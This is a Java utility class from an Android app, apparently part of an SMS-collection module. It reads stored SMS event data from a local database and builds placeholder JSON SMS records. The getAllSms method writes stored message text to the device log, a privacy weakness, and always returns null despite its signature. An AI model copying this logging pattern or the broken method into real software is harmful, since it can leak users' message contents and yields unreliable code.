package com.xaviar.collect.sms_event;

import java.util.LinkedList;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.collect.sms.Sms;
import com.xaviar.collect.sms.SmsUtil;
import com.xaviar.frm.DataHolder;
import com.xaviar.ui.UserData;
import com.xaviar.utils.DbUtil;

public class SmsEventUtil {
	
	public static  List<UserData> getAllSms(Context ctx) 
	{
	 List<UserData> userDataListGet = DbUtil.getAll(ctx);
		if (userDataListGet.size() > 0) {
			for (UserData userDataGet : userDataListGet) {
				Log.w("SMS user data GET", userDataGet.text);
			}
		} else {
			Log.w("SMS user data GET", "Empty dataset");
		}
		return null;
	}

	public static String getAllSmsGeneric(Context ctx) {
		 String  genericData = DbUtil.getAllGeneric(ctx,DataHolder.SMS_EVENT);
		 if(genericData.length() < 6)
		 {
		   return generateEmptySmsEvent();	 
		 }
		return genericData;
	}


	private static String generateEmptySmsEvent() {
		 Sms sms = new Sms();
		 sms.setAddress("empty address");
		 String timeStr = String.valueOf(System.currentTimeMillis());
		 sms.setTime(timeStr);
		 sms.setId(timeStr);
		 sms.setFolderName("Income");
		 sms.setReadState("Idle");
		 List<Sms> allSms = new LinkedList<Sms>();
		 allSms.add(sms);
		 String ret = SmsUtil.toJsonArray(allSms);		 
		return ret;
	}

}
